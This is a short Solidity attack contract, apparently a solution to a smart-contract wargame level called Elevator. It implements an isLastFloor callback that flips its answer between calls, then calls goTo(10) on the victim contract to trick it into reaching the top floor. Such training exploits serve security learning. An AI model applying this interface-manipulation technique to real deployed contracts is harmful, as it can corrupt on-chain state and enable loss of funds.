pragma solidity ^0.4.18;

import '../levels/Elevator.sol';

contract ElevatorAttack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
